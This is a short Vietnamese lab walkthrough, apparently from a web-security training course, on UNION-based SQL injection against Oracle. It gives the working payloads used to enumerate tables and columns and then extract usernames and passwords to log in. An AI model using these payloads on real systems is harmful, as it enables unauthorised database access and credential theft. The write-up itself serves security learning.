# SQL injection attack, listing the database contents on Oracle

Như thường lệ ta check xem có bao nhiêu cột và kiểu dữ liệu trong cột đó là gì, làm như những bài trước thì ta thấy có 2 cột và kiểu dữ liệu string.

Ta sử dụng câu lệnh `' UNION SELECT TABLE_NAME, NULL FROM all_tables--` để liệt kê ra tên các bảng, sau đó tìm bảng có tên liên quan tới `users` 

![](https://cdn.discordapp.com/attachments/1124588087931043891/1134670055272095844/image.png)

Tiếp theo ta sử dụng câu lệnh `' UNION SELECT column_name, NULL FROM all_tab_columns WHERE TABLE_NAME = 'USERS_PNGFYN'--` để liệt kê ra tên các cột bên trong bảng `USERS_PNGFYN`.

![](https://cdn.discordapp.com/attachments/1124588087931043891/1134671364763172904/image.png)

Tiếp theo ta sử dụng câu lệnh `' UNION SELECT USERNAME_AMKXFJ, PASSWORD_DHLXFT FROM USERS_PNGFYN--` để truy cập vào thông tin 2 cột trên và đăng nhập thui

![](https://cdn.discordapp.com/attachments/1124588087931043891/1134671911360675861/image.png)

Login và hoàn thành bài lab thui!